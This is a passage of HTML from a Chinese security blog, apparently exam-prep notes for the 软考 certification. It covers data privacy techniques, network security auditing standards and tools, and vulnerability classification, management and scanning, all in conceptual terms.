-<li><strong>四类隐私</strong>：<strong>身份隐私、属性隐私、社交关系隐私、位置轨迹隐私</strong>。</li>
-<li><strong>保护目标</strong>：<strong>通过安全修改处理，使数据可公开发布而不会遭受隐私攻击，并最大可能保留原数据使用价值</strong>。</li>
-<li><strong>核心算法</strong>：<ul>
-<li><strong>k-匿名方法</strong>：对所有元组进行<strong>泛化处理</strong>（不再一一对应），但<strong>容易遭到一致性攻击</strong>。改进方案为 <strong>l-多样性方法</strong>（每个敏感属性至少有<strong>l个不同的值</strong>）。</li>
-<li><strong>差分隐私方法</strong>：通过<strong>添加随机噪声</strong>保护数据。</li>
-</ul>
-</li>
-<li><strong>操作方法</strong>：<strong>抑制</strong>（置空）、<strong>泛化</strong>（降精度）、<strong>置换</strong>（改属主）、<strong>扰动</strong>（加噪声）、<strong>裁剪</strong>（分开发布）。</li>
-<li><strong>脱敏处理</strong>：<strong>匿名化</strong>（<strong>处理后不能被复原</strong>）与 <strong>去标识化</strong>（采用<strong>假名、加密、Hash函数</strong>等置换）。系统敏感口令也常用<strong>Hash函数处理后再保存</strong>。</li>
-</ul>
-<h3 id="9-网络安全前沿技术动向"><a href="#9-网络安全前沿技术动向" class="headerlink" title="9. 网络安全前沿技术动向"></a>9. 网络安全前沿技术动向</h3><ul>
-<li><strong>网络威胁情报</strong>：指<strong>有关网络信息系统遭受安全威胁的信息</strong>（如漏洞、<strong>攻击来源IP、恶意邮箱/域名、攻击工具等</strong>）。</li>
-<li><strong>同态加密</strong>：允许在密文上直接进行计算，解密后的结果与明文计算结果一致（包括加同态、乘同态和全同态）。</li>
-<li><strong>DNS域名安全</strong>：DNS是<strong>逐级授权的分布式数据查询系统（完成域名到IP的翻译）</strong>，分为<strong>递归</strong>和<strong>权威（根、顶级等各级组成）</strong>。主要风险包括：<strong>域名信息篡改、解析配置错误、域名劫持、软件安全漏洞</strong>。</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://zyufoye.github.io/2026/03/09/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/uploads/kehan.jpg">
-      <meta itemprop="name" content="Aono">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Aono Note">
-      <meta itemprop="description" content="专注于网络安全学习与实践的个人博客，记录AI安全、攻防技术、漏洞分析、工具使用与踩坑经验。 不生产知识，只做知识的搬运工。">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Aono Note">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2026/03/09/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1/" class="post-title-link" itemprop="url">网络安全审计</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2026-03-09 22:23:58 / 修改时间：22:27:57" itemprop="dateCreated datePublished" datetime="2026-03-09T22:23:58+08:00">2026-03-09</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E8%BD%AF%E8%80%83/" itemprop="url" rel="index"><span itemprop="name">软考</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="一、网络安全审计概述"><a href="#一、网络安全审计概述" class="headerlink" title="一、网络安全审计概述"></a>一、网络安全审计概述</h2><h3 id="核心概念"><a href="#核心概念" class="headerlink" title="核心概念"></a>核心概念</h3><blockquote>
-<p><strong>网络安全审计</strong>：对网络信息系统的安全相关活动信息进行<strong>获取、记录、存储、分析和利用</strong>的工作。</p>
-</blockquote>
-<h3 id="核心作用"><a href="#核心作用" class="headerlink" title="核心作用"></a>核心作用</h3><ul>
-<li>建立”<strong>事后</strong>“安全保障措施</li>
-<li>保存网络安全事件及行为信息</li>
-<li>为安全事件分析提供<strong>线索及证据</strong></li>
-<li>发现潜在威胁，支撑风险分析与管理</li>
-</ul>
-<h3 id="相关标准"><a href="#相关标准" class="headerlink" title="相关标准"></a>相关标准</h3><div class="table-container">
-<table>
-<thead>
-<tr>
-<th>标准</th>
-<th>关键内容</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><strong>TCSEC</strong>（美国，1985）</td>
-<td>从 <strong>C2级</strong> 开始提出安全审计要求，B3级及以上不再变化</td>
-</tr>
-<tr>
-<td><strong>GB 17859</strong>（中国）</td>
-<td>从<strong>第二级</strong>开始要求审计机制；第二级称为”<strong>系统审计保护级</strong>“</td>
-</tr>
-</tbody>
-</table>
-</div>
-<h3 id="计算机系统安全保护能力的五个等级审计要求"><a href="#计算机系统安全保护能力的五个等级审计要求" class="headerlink" title="计算机系统安全保护能力的五个等级审计要求"></a>计算机系统安全保护能力的五个等级审计要求</h3><div class="table-container">
-<table>
-<thead>
-<tr>
-<th>级别类型</th>
-<th>安全审计要求（核心内容）</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><strong>用户自主保护级</strong></td>
-<td>无</td>
-</tr>
-<tr>
-<td><strong>系统审计保护级</strong></td>
-<td>① 创建并维护受保护客体的<strong>访问审计跟踪记录</strong>，阻止非授权用户访问或破坏 ② 记录事件包括：<strong>用户身份鉴别、客体引入用户地址空间、删除客体、操作员/系统管理员操作、安全相关事件</strong> ③ 每条记录包含：<strong>日期时间、用户、事件类型、成功与否</strong> ④ 提供审计记录接口，可由授权主体调用</td>
-</tr>
-<tr>
-<td><strong>安全标记保护级</strong></td>
-<td>在系统审计保护级基础上，增强： ① 审计记录包含<strong>客体名及客体安全级别</strong> ② 系统具有<strong>审计更改可读输出记号</strong>的能力</td>
-</tr>
-<tr>
-<td><strong>结构化保护级</strong></td>
-<td>在安全标记保护级基础上，增强： ① 系统能够利用<strong>隐蔽存储信道</strong>时可能被使用的事件进行审计</td>
-</tr>
-<tr>
-<td><strong>访问验证保护级</strong></td>
-<td>在结构化保护级基础上，增强： ① 对安全事件进行<strong>实时监控</strong> ② 超过阈值时，<strong>立即向安全管理员发出报警</strong> ③ 安全相关事件继续发生或积累时，系统以<strong>最小代价中止这些事件</strong></td>
-</tr>
-</tbody>
-</table>
-</div>
-<p><strong>📌 规律总结：</strong> 审计要求随级别提升逐步增强</p>
-<ul>
-<li>第1级：<strong>无要求</strong></li>
-<li>第2级：<strong>基础审计</strong>（记录 + 跟踪）</li>
-<li>第3级：<strong>增加安全标记</strong>（客体名/级别）</li>
-<li>第4级：<strong>增加隐蔽信道审计</strong></li>
-<li>第5级：<strong>增加实时告警与主动阻断</strong></li>
-</ul>
-<h2 id="二、网络安全审计系统组成与类型"><a href="#二、网络安全审计系统组成与类型" class="headerlink" title="二、网络安全审计系统组成与类型"></a>二、网络安全审计系统组成与类型</h2><h3 id="系统组成"><a href="#系统组成" class="headerlink" title="系统组成"></a>系统组成</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">审计信息获取 → 审计信息存储 → 审计信息分析 → 审计信息展示及利用 → 系统管理</span><br></pre></td></tr></table></figure>
-<h3 id="审计类型（按审计对象）"><a href="#审计类型（按审计对象）" class="headerlink" title="审计类型（按审计对象）"></a>审计类型（按审计对象）</h3><p>操作系统 / 数据库 / 网络通信 / 应用系统 / 网络安全设备 / 工控 / 移动 / 互联网 / 代码</p>
-<h3 id="各系统审计内容（重点）"><a href="#各系统审计内容（重点）" class="headerlink" title="各系统审计内容（重点）"></a>各系统审计内容（重点）</h3><p><strong>Windows 审计信息：</strong></p>
-<ul>
-<li>注册登录事件、目录服务访问、账户管理、对象访问、策略变更、特权使用、进程跟踪、系统事件</li>
-</ul>
-<p><strong>Linux 审计信息：</strong></p>
-<ul>
-<li><code>boot.log</code>（开机自检）、<code>acct/pacct</code>（用户命令）、<code>lastlog</code>（最近登录）、<code>sulog</code>（su命令）、<code>utmp</code>（当前用户）、<code>wtmp</code>（登录退出）、<code>maillog</code>（邮件）、<code>messages</code>（系统消息）</li>
-</ul>
-<p><strong>网络通信审计常见内容：</strong></p>
-<blockquote>
-<p><strong>IP源地址、IP目的地址、源端口号、目的端口号、协议类型、传输内容</strong></p>
-</blockquote>
-<h2 id="三、网络安全审计机制与实现技术"><a href="#三、网络安全审计机制与实现技术" class="headerlink" title="三、网络安全审计机制与实现技术"></a>三、网络安全审计机制与实现技术</h2><h3 id="1-网络流量数据获取技术"><a href="#1-网络流量数据获取技术" class="headerlink" title="1. 网络流量数据获取技术"></a>1. 网络流量数据获取技术</h3><div class="table-container">
-<table>
-<thead>
-<tr>
-<th>技术方法</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><strong>共享网络监听</strong></td>
-<td>利用 Hub 集线器构建共享式网络，采集设备接入Hub</td>
-</tr>
-<tr>
-<td><strong>交换机端口镜像</strong>（Port Mirroring）</td>
-<td>将交换机流量复制到审计端口</td>
-</tr>
-<tr>
-<td><strong>网络分流器</strong>（Network TAP）</td>
-<td>用于不支持端口镜像的交换机</td>
-</tr>
-</tbody>
-</table>
-</div>
-<h3 id="2-常见网络数据采集软件"><a href="#2-常见网络数据采集软件" class="headerlink" title="2. 常见网络数据采集软件"></a>2. 常见网络数据采集软件</h3><div class="table-container">
-<table>
-<thead>
-<tr>
-<th>工具</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><strong>Libpcap</strong></td>
-<td>开源网络数据采集库，Linux平台</td>
-</tr>
-<tr>
-<td><strong>Winpcap</strong></td>
-<td>Windows平台网络数据捕获</td>
-</tr>
-<tr>
-<td><strong>Windump</strong></td>
-<td>基于Winpcap的协议分析工具</td>
-</tr>
-<tr>
-<td><strong>Tcpdump</strong></td>
-<td>基于Libpcap，Linux常用</td>
-</tr>
-<tr>
-<td><strong>Wireshark</strong></td>
-<td>图形化采集与分析工具</td>
-</tr>
-</tbody>
-</table>
-</div>
-<p><strong>Libpcap 工作流程：</strong><br>① 设置嗅探网络接口（Linux默认eth0）→ ② 初始化并设定过滤规则 → ③ 循环接收符合规则的数据包</p>
-<h3 id="3-审计数据安全分析技术"><a href="#3-审计数据安全分析技术" class="headerlink" title="3. 审计数据安全分析技术"></a>3. 审计数据安全分析技术</h3><div class="table-container">
-<table>
-<thead>
-<tr>
-<th>技术</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><strong>字符串匹配</strong></td>
-<td>使用 <code>grep</code> 工具，基于正则表达式模式匹配</td>
-</tr>
-<tr>
-<td><strong>全文搜索</strong></td>
-<td>利用搜索引擎技术分析审计数据</td>
-</tr>
-<tr>
-<td><strong>数据关联</strong></td>
-<td>综合多源数据（日志、流量、安全设备）发现异常，识别未知攻击</td>
-</tr>
-<tr>
-<td><strong>统计报表</strong></td>
-<td>对事件、阈值、安全基线统计，生成日/周/月报及告警</td>
-</tr>
-<tr>
-<td><strong>可视化分析</strong></td>
-<td>饼图、柱状图、折线图、地图、仪表盘；关键KPI高亮显示</td>
-</tr>
-</tbody>
-</table>
-</div>
-<h3 id="4-审计数据保护技术"><a href="#4-审计数据保护技术" class="headerlink" title="4. 审计数据保护技术"></a>4. 审计数据保护技术</h3><div class="table-container">
-<table>
-<thead>
-<tr>
-<th>措施</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><strong>系统用户分权管理</strong></td>
-<td>操作员（操作维护）、安全员（安全策略）、审计员（审计查看），三权分立，互相制约</td>
-</tr>
-<tr>
-<td><strong>强制访问控制</strong></td>
-<td>设置安全标记，防止非授权查询/修改</td>
-</tr>
-<tr>
-<td><strong>审计数据加密</strong></td>
-<td>加密敏感审计数据，防泄露</td>
-</tr>
-<tr>
-<td><strong>隐私保护</strong></td>
-<td>防止审计数据泄露隐私信息</td>
-</tr>
-<tr>
-<td><strong>完整性保护</strong></td>
-<td>使用 <strong>Hash算法和数字签名</strong>，防止非授权修改</td>
-</tr>
-</tbody>
-</table>
-</div>
-<h2 id="四、网络安全审计主要产品与技术指标"><a href="#四、网络安全审计主要产品与技术指标" class="headerlink" title="四、网络安全审计主要产品与技术指标"></a>四、网络安全审计主要产品与技术指标</h2><h3 id="各类产品对比"><a href="#各类产品对比" class="headerlink" title="各类产品对比"></a>各类产品对比</h3><div class="table-container">
-<table>
-<thead>
-<tr>
-<th>产品类型</th>
-<th>基本原理</th>
-<th>主要功能</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><strong>日志安全审计</strong></td>
-<td>利用Syslog、NetFlow、SSH等采集异构日志</td>
-<td>日志采集/存储/分析/查询/告警/报表</td>
-</tr>
-<tr>
-<td><strong>主机监控与审计</strong></td>
-<td>代理程序采集主机行为</td>
-<td>用户监控、配置管理、补丁管理、U盘管理、非法外联管理</td>
-</tr>
-<tr>
-<td><strong>数据库审计</strong></td>
-<td>流量监听/自带审计/Agent</td>
-<td>记录读写查询增删改操作，可回放</td>
-</tr>
-<tr>
-<td><strong>网络安全审计</strong></td>
-<td>网络流量采集+深度内容分析</td>
-<td>邮件/网页/文件/FTP/Telnet/DNS审计</td>
-</tr>
-<tr>
-<td><strong>工控审计</strong></td>
-<td>流量采集+工控协议识别还原</td>
-<td>记录工控操作信息</td>
-</tr>
-<tr>
-<td><strong>运维安全审计</strong></td>
-<td>流量采集/服务代理</td>
-<td>字符会话/图形操作/数据库运维/文件传输/合规审计</td>
-</tr>
-</tbody>
-</table>
-</div>
-<h3 id="数据库审计三种方式"><a href="#数据库审计三种方式" class="headerlink" title="数据库审计三种方式"></a>数据库审计三种方式</h3><div class="table-container">
-<table>
-<thead>
-<tr>
-<th>方式</th>
-<th>优点</th>
-<th>缺点</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><strong>网络监听审计</strong></td>
-<td>不影响数据库服务器性能</td>
-<td>无法审计加密流量；无法审计本地操作</td>
-</tr>
-<tr>
-<td><strong>自带审计</strong></td>
-<td>能审计网络和本地操作</td>
-<td>影响性能；日志本地存储易被删除</td>
-</tr>
-<tr>
-<td><strong>数据库Agent</strong></td>
-<td>能审计网络和本地操作</td>
-<td>需安装在服务器，影响性能/稳定性</td>
-</tr>
-</tbody>
-</table>
-</div>
-<h3 id="运维安全审计五大功能"><a href="#运维安全审计五大功能" class="headerlink" title="运维安全审计五大功能"></a>运维安全审计五大功能</h3><ol>
-<li><strong>字符会话审计</strong>：SSH、Telnet操作（时间、IP、命令等）</li>
-<li><strong>图形操作审计</strong>：RDP、VNC、HTTP/HTTPS图形操作</li>
-<li><strong>数据库运维审计</strong>：Oracle、MS SQL Server、DB2、PostgreSQL等</li>
-<li><strong>文件传输审计</strong>：FTP、SFTP操作（含文件名、危险等级）</li>
-<li><strong>合规审计</strong>：对运维操作进行合规符合性检查</li>
-</ol>
-<h2 id="五、网络安全审计应用（重点场景）"><a href="#五、网络安全审计应用（重点场景）" class="headerlink" title="五、网络安全审计应用（重点场景）"></a>五、网络安全审计应用（重点场景）</h2><div class="table-container">
-<table>
-<thead>
-<tr>
-<th>应用场景</th>
-<th>关键说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><strong>安全运维保障</strong></td>
-<td>防范运维人员绕行堡垒机等违规操作，追溯安全威胁</td>
-</tr>
-<tr>
-<td><strong>数据访问监测</strong></td>
-<td>发现绕过前台业务系统直接操作数据库的违规行为</td>
-</tr>
-<tr>
-<td><strong>网络入侵检测</strong></td>
-<td>检测黑客入侵、扫描渗透、<strong>暴力破解</strong>、蠕虫、DDoS等；通过连续认证失败告警</td>
-</tr>
-<tr>
-<td><strong>网络电子取证</strong></td>
-<td>通过日志文件确定嫌疑IP，提供犯罪证据</td>
-</tr>
-</tbody>
-</table>
-</div>
-<h2 id="📌-高频考点速记"><a href="#📌-高频考点速记" class="headerlink" title="📌 高频考点速记"></a>📌 高频考点速记</h2><ol>
-<li>TCSEC → <strong>C2级</strong>起有审计；GB 17859 → <strong>第二级</strong>起有审计</li>
-<li>三大流量获取技术：<strong>Hub监听、端口镜像、TAP分流器</strong></li>
-<li>数据采集工具：<strong>Libpcap（Linux）、Winpcap（Windows）、Wireshark（图形化）</strong></li>
-<li>审计数据完整性保护：<strong>Hash + 数字签名</strong></li>
-<li>三权分立：<strong>操作员、安全员、审计员</strong>互相制约</li>
-<li>数据库审计三方式：<strong>网络监听、自带审计、Agent</strong></li>
-<li>运维审计记录：”<strong>在什么终端、什么时间、登录什么设备、做了什么操作、什么时间登出</strong>“</li>
-</ol>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://zyufoye.github.io/2026/03/09/%E6%BC%8F%E6%B4%9E%E9%98%B2%E6%8A%A4/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/uploads/kehan.jpg">
-      <meta itemprop="name" content="Aono">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Aono Note">
-      <meta itemprop="description" content="专注于网络安全学习与实践的个人博客，记录AI安全、攻防技术、漏洞分析、工具使用与踩坑经验。 不生产知识，只做知识的搬运工。">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Aono Note">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2026/03/09/%E6%BC%8F%E6%B4%9E%E9%98%B2%E6%8A%A4/" class="post-title-link" itemprop="url">漏洞防护</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2026-03-09 22:23:44 / 修改时间：22:27:28" itemprop="dateCreated datePublished" datetime="2026-03-09T22:23:44+08:00">2026-03-09</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E8%BD%AF%E8%80%83/" itemprop="url" rel="index"><span itemprop="name">软考</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="一、网络安全漏洞概述"><a href="#一、网络安全漏洞概述" class="headerlink" title="一、网络安全漏洞概述"></a>一、网络安全漏洞概述</h2><h3 id="核心概念"><a href="#核心概念" class="headerlink" title="核心概念"></a>核心概念</h3><blockquote>
-<p><strong>网络安全漏洞</strong>（脆弱性）：致使网络信息系统安全策略相冲突的缺陷，通常称为安全隐患。</p>
-</blockquote>
-<h3 id="漏洞影响范围"><a href="#漏洞影响范围" class="headerlink" title="漏洞影响范围"></a>漏洞影响范围</h3><p>机密性受损 / 完整性破坏 / 可用性降低 / 抗抵赖性缺失 / 可控制性下降 / 真实性不保</p>
-<h3 id="漏洞分类（按补丁状况）⭐"><a href="#漏洞分类（按补丁状况）⭐" class="headerlink" title="漏洞分类（按补丁状况）⭐"></a>漏洞分类（按补丁状况）⭐</h3><div class="table-container">
-<table>
-<thead>
-<tr>
-<th>类型</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><strong>普通漏洞</strong></td>
-<td>漏洞信息已广泛公开，安全厂商已有修补方案</td>
-</tr>
-<tr>
-<td><strong>零日漏洞（Zero-day）</strong></td>
-<td>新发现、<strong>尚未提供补丁</strong>的漏洞，通常用于<strong>定向攻击</strong></td>
-</tr>
-</tbody>
-</table>
-</div>
-<h3 id="漏洞威胁类型"><a href="#漏洞威胁类型" class="headerlink" title="漏洞威胁类型"></a>漏洞威胁类型</h3><p>网络信息系统漏洞的存在是攻击成功的必要条件之一。</p>
-<blockquote>
-<p>敏感信息泄露 / 未授权访问 / 身份假冒 / 拒绝服务</p>
-</blockquote>
-<h3 id="我国漏洞相关平台与标准-⭐"><a href="#我国漏洞相关平台与标准-⭐" class="headerlink" title="我国漏洞相关平台与标准 ⭐"></a>我国漏洞相关平台与标准 ⭐</h3><ul>
-<li><strong>CNNVD</strong>：国家信息安全漏洞库（中国信息安全测评中心建设）</li>
-<li><strong>CNVD</strong>：国家信息安全漏洞共享平台（国家计算机网络应急技术处理协调中心）</li>
-<li>相关标准：GB/T 33561 / GB/T 30279 / GB/T 28458 / GB/T 30276</li>
-</ul>
-<h2 id="二、网络安全漏洞分类与管理"><a href="#二、网络安全漏洞分类与管理" class="headerlink" title="二、网络安全漏洞分类与管理"></a>二、网络安全漏洞分类与管理</h2><h3 id="漏洞来源分类"><a href="#漏洞来源分类" class="headerlink" title="漏洞来源分类"></a>漏洞来源分类</h3><h4 id="非技术性安全漏洞（5类）"><a href="#非技术性安全漏洞（5类）" class="headerlink" title="非技术性安全漏洞（5类）"></a>非技术性安全漏洞（5类）</h4><div class="table-container">
-<table>
-<thead>
-<tr>
-<th>类型</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>安全责任主体不明确</td>
-<td>缺少负责安全的机构</td>
-</tr>
-<tr>
-<td>安全策略不完备</td>
-<td>缺少规范的安全策略</td>
-</tr>
-<tr>
-<td>操作技能不足</td>
-<td>缺少安全培训机制</td>
-</tr>
-<tr>
-<td>安全监督缺失</td>
-<td>缺少强有力的监督机制</td>
-</tr>
-<tr>
-<td>特权控制不完备</td>
-<td>超级用户权限缺少审计和约束</td>
-</tr>
-</tbody>
-</table>
-</div>
-<h4 id="技术性安全漏洞（8类）⭐"><a href="#技术性安全漏洞（8类）⭐" class="headerlink" title="技术性安全漏洞（8类）⭐"></a>技术性安全漏洞（8类）⭐</h4><div class="table-container">
-<table>
-<thead>
-<tr>
-<th>类型</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><strong>设计错误</strong></td>
-<td>系统或程序设计错误导致</td>
-</tr>
-<tr>
-<td><strong>输入验证错误</strong></td>
-<td>未验证用户输入合法性</td>
-</tr>
-<tr>
-<td><strong>缓冲区溢出</strong></td>
-<td>输入数据超过缓冲区规定长度，破坏堆栈</td>
-</tr>
-<tr>
-<td><strong>意外情况处置错误</strong></td>
-<td>未考虑意外情况导致运行出错</td>
-</tr>
-<tr>
-<td><strong>访问验证错误</strong></td>
-<td>逻辑错误使攻击者绕过访问控制</td>
-</tr>
-<tr>
-<td><strong>配置错误</strong></td>
-<td>配置参数、权限、策略配置有误</td>
-</tr>
-<tr>
-<td><strong>竞争条件</strong></td>
-<td>时序和同步问题造成的短暂可利用时机</td>
-</tr>
-<tr>
-<td><strong>环境错误</strong></td>
-<td>环境变量错误或被恶意设置</td>
-</tr>
-</tbody>
-</table>
-</div>
-<h3 id="漏洞分类标准-⭐"><a href="#漏洞分类标准-⭐" class="headerlink" title="漏洞分类标准 ⭐"></a>漏洞分类标准 ⭐</h3><h4 id="1-CVE（美国MITRE公司）"><a href="#1-CVE（美国MITRE公司）" class="headerlink" title="1. CVE（美国MITRE公司）"></a>1. CVE（美国MITRE公司）</h4><ul>
-<li>安全漏洞统一标识字典，目标是<strong>便于共享漏洞数据</strong></li>
-<li>CVE ID 格式：<strong>年份数字 + 其他数字</strong>，如 <code>CVE-2019-1543</code></li>
-<li>条目内容：标识数字 + 漏洞简要描述 + 至少一个公开参考</li>
-</ul>
-<h4 id="2-CVSS（通用漏洞计分系统）⭐"><a href="#2-CVSS（通用漏洞计分系统）⭐" class="headerlink" title="2. CVSS（通用漏洞计分系统）⭐"></a>2. CVSS（通用漏洞计分系统）⭐</h4><p>评分由三部分组成：</p>
-<div class="table-container">
-<table>
-<thead>
-<tr>
-<th>计分维度</th>
-<th>关键参数</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><strong>基本度量计分</strong></td>
-<td>攻击向量、攻击复杂性、特权要求、用户交互、完整性/保密性/可用性影响、影响范围</td>
-</tr>
-<tr>
-<td><strong>时序度量计分</strong></td>
-<td>漏洞利用代码成熟度、修补级别、漏洞报告可信度</td>
-</tr>
-<tr>
-<td><strong>环境度量计分</strong></td>
-<td>完整性/保密性/可用性要求、修订基本得分</td>
-</tr>
-</tbody>
-</table>
-</div>
-<h4 id="3-我国漏洞分类-⭐"><a href="#3-我国漏洞分类-⭐" class="headerlink" title="3. 我国漏洞分类 ⭐"></a>3. 我国漏洞分类 ⭐</h4><p><strong>CNNVD 漏洞分类（25类，重点记）：</strong></p>
-<blockquote>
-<p>配置错误、代码问题、资源管理错误、数字错误、信息泄露、竞争条件、输入验证、缓冲区错误、格式化字符串、<strong>跨站脚本、路径遍历、后置链接、SQL注入、代码注入、命令注入</strong>、操作系统命令注入、安全特征问题、授权问题、信任管理、加密问题、未充分验证数据可靠性、<strong>跨站请求伪造</strong>、权限许可和访问控制、访问控制错误、资料不足</p>
-</blockquote>
-<p><strong>CNVD 漏洞分类（11类）：</strong></p>
-<blockquote>
-<p>输入验证错误、访问验证错误、意外情况处理错误、边界条件错误、配置错误、竞争条件、环境错误、设计错误、缓冲区错误、其他错误、未知错误</p>
-</blockquote>
-<p><strong>CNVD 危害级别：高 / 中 / 低 三级</strong></p>
-<h4 id="4-OWASP-TOP-10（Web应用漏洞）⭐"><a href="#4-OWASP-TOP-10（Web应用漏洞）⭐" class="headerlink" title="4. OWASP TOP 10（Web应用漏洞）⭐"></a>4. OWASP TOP 10（Web应用漏洞）⭐</h4><blockquote>
-<p>注入、失效的身份认证、敏感信息泄露、XML外部实体(XXE)、失效的访问控制、安全配置错误、<strong>跨站脚本(XSS)</strong>、不安全的反序列化、使用含已知漏洞的组件、不足的日志记录和监控、未验证的重定向和转发、非安全加密存储</p>
-</blockquote>
-<h3 id="漏洞管理过程（5个环节）⭐"><a href="#漏洞管理过程（5个环节）⭐" class="headerlink" title="漏洞管理过程（5个环节）⭐"></a>漏洞管理过程（5个环节）⭐</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">① 资产确认 → ② 漏洞信息采集 → ③ 漏洞评估 → ④ 漏洞消除和控制 → ⑤ 漏洞变化跟踪</span><br></pre></td></tr></table></figure>
-<div class="table-container">
-<table>
-<thead>
-<tr>
-<th>环节</th>
-<th>核心内容</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><strong>资产确认</strong></td>
-<td>摸底调查，建立信息资产档案</td>
-</tr>
-<tr>
-<td><strong>漏洞信息采集</strong></td>
-<td>收集漏洞类型、补丁级别、影响资产</td>
-</tr>
-<tr>
-<td><strong>漏洞评估</strong></td>
-<td>评估业务影响、被利用可能性、修补级别，形成威胁排序</td>
-</tr>
-<tr>
-<td><strong>漏洞消除和控制</strong></td>
-<td><strong>安装补丁包、升级系统、更新IPS/IDS特征库、变更管理流程</strong></td>
-</tr>
-<tr>
-<td><strong>漏洞变化跟踪</strong></td>
-<td>持续跟踪漏洞状态，持续修补</td>
-</tr>
-</tbody>
-</table>
-</div>
-<h2 id="三、网络安全漏洞扫描技术"><a href="#三、网络安全漏洞扫描技术" class="headerlink" title="三、网络安全漏洞扫描技术"></a>三、网络安全漏洞扫描技术</h2><h3 id="漏洞扫描器组成（4模块）"><a href="#漏洞扫描器组成（4模块）" class="headerlink" title="漏洞扫描器组成（4模块）"></a>漏洞扫描器组成（4模块）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户界面 → 扫描引擎 → 漏洞扫描结果分析 → 漏洞信息及配置参数库</span><br></pre></td></tr></table></figure>
-<h3 id="漏洞扫描器三种类型-⭐"><a href="#漏洞扫描器三种类型-⭐" class="headerlink" title="漏洞扫描器三种类型 ⭐"></a>漏洞扫描器三种类型 ⭐</h3><div class="table-container">
-<table>
-<thead>
-<tr>
-<th>类型</th>
-<th>特点</th>
-<th>局限</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><strong>主机漏洞扫描器</strong></td>
-<td>检查本地关键文件内容及安全属性，无需网络连接，只能单机检测</td>
-<td>仅限本地</td>
-</tr>
-<tr>
-<td><strong>网络漏洞扫描器</strong></td>
-<td>建立网络连接，发送特定请求，便于远程检查</td>
-<td>无本地权限，检查能力受限</td>
-</tr>
-<tr>
-<td><strong>专用漏洞扫描器</strong></td>
-<td>针对特定系统（数据库/网络设备/Web/工控）</td>
-<td>范围专一</td>
-</tr>
-</tbody>
-</table>
-</div>
